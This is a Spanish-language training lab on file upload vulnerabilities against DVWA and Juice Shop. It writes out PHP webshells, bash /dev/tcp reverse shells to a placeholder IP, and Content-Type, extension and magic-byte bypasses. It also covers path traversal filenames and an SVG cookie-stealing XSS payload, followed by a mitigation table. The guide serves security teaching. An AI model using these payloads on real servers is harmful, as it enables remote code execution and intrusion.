# Lab 05 — File Upload Vulnerabilities

## Objetivo

Explotar validaciones incorrectas en funcionalidades de subida de archivos para cargar webshells PHP y obtener ejecución remota de código (RCE) en el servidor.

**App objetivo:** DVWA → File Upload (Security: Low → Medium → High)

---

## Conceptos

Una subida de archivos sin restricciones adecuadas permite al atacante cargar archivos ejecutables (PHP, JSP, ASP) que el servidor procesará como código.

```
Atacante sube:  shell.php
Servidor guarda: /var/www/html/uploads/shell.php
Atacante visita: http://objetivo.com/uploads/shell.php?cmd=id
Resultado: uid=33(www-data) gid=33(www-data)
```

---

## Parte 1 — Webshell básica (DVWA Low)

**DVWA → File Upload → Security: Low**

No hay validación. Sube directamente:

### Crear la webshell

```php
<?php system($_GET['cmd']); ?>
```

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Subir y ejecutar

```
1. Subir shell.php en DVWA → File Upload
2. Anotar la ruta: ../../hackable/uploads/shell.php
3. Acceder:
   http://localhost:8080/hackable/uploads/shell.php?cmd=id
   http://localhost:8080/hackable/uploads/shell.php?cmd=whoami
   http://localhost:8080/hackable/uploads/shell.php?cmd=cat+/etc/passwd
```

### Webshell mejorada

```php
<?php
if(isset($_GET['cmd'])){
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
}
?>
```

---

## Parte 2 — Reverse shell desde la webshell

```bash
# En tu máquina: preparar listener
nc -lvnp 4444

# Payload de reverse shell (en el parámetro cmd de la webshell)
# URL-encodear antes de enviar desde el navegador

bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'

# Versión URL-encoded:
bash+-c+'bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261'

# O usar el código PHP directamente como archivo:
```

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'");
?>
```

---

## Parte 3 — Bypass de validaciones (Medium)

**DVWA → Security: Medium** — solo permite imágenes (`image/jpeg`, `image/png`)

### Bypass de Content-Type

El servidor solo valida el header `Content-Type`, no el contenido real:

```
Con Burp → interceptar la subida de shell.php
Modificar:
  Content-Type: application/octet-stream  →  Content-Type: image/jpeg
Forward → subida exitosa
```

### Archivo con extensión doble

```bash
mv shell.php shell.php.jpg
# Si el servidor solo valida la extensión final → pasa
# Si ejecuta todo antes del punto → problema para el atacante
```

### Cambiar extensión a alternativas PHP

```bash
shell.phtml
shell.php5
shell.php3
shell.pHp       # mayúsculas si la validación es case-sensitive
shell.php%00.jpg  # null byte (en servidores antiguos)
```

---

## Parte 4 — Bypass avanzado (High)

**DVWA → Security: High** — valida los primeros bytes del archivo (magic bytes)

Los archivos JPEG empiezan con los bytes `FF D8 FF`:

```bash
# Crear imagen JPEG falsa con PHP embebido

# Método 1: exiftool
exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagen_real.jpg
cp imagen_real.jpg shell.jpg.php

# Método 2: magic bytes manuales
printf '\xFF\xD8\xFF\xE0' > fake.jpg
echo '<?php system($_GET["cmd"]); ?>' >> fake.jpg

# Método 3: imagen real con código PHP al final
cat real_image.jpg <(echo '<?php system($_GET["cmd"]); ?>') > shell.jpg
```

```bash
# Verificar magic bytes
file shell.jpg          # debe decir "JPEG image data"
hexdump -C shell.jpg | head -2
```

---

## Parte 5 — File Upload + Path Traversal

Si el servidor guarda archivos en una ruta controlada por el usuario:

```
Nombre de archivo: ../../../var/www/html/shell.php
# El servidor guarda fuera del directorio uploads
# Si no hay sanitización de '../' → escritura arbitraria de archivos
```

```bash
# Con Burp, modificar el filename en el multipart form:
Content-Disposition: form-data; name="file"; filename="../../../shell.php"
```

---

## Parte 6 — Juice Shop — File Upload

```bash
# Juice Shop acepta avatares de usuario
# Ir a: http://localhost:3000/#/profile
# Subir una imagen como avatar

# Con Burp interceptar:
# Cambiar Content-Type a application/xml o text/html
# Subir un archivo SVG con XSS embebido:
```

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

---

## Detección y mitigaciones

| Control | Descripción |
|---------|-------------|
| Validar Content-Type en servidor | No confiar en el header del cliente |
| Validar magic bytes | Primeros bytes del archivo, no la extensión |
| Renombrar archivos subidos | UUID aleatoria — impide predecir la ruta |
| Almacenar fuera del webroot | `/var/uploads/` en vez de `/var/www/html/uploads/` |
| No ejecutar archivos subidos | Servir como `application/octet-stream` |
| Antivirus/sandbox | Escanear antes de almacenar |

---

## Actividades

1. Subir shell.php en DVWA Low y ejecutar `id`, `whoami`, `cat /etc/passwd`
2. Obtener una reverse shell completa
3. Bypassear el filtro de Medium modificando el Content-Type en Burp
4. Bypassear el filtro de High con magic bytes + exiftool
5. Subir un SVG malicioso en Juice Shop y demostrar XSS

---

## Referencias

- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [PayloadsAllTheThings — File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [Magic Bytes Reference](https://en.wikipedia.org/wiki/List_of_file_signatures)
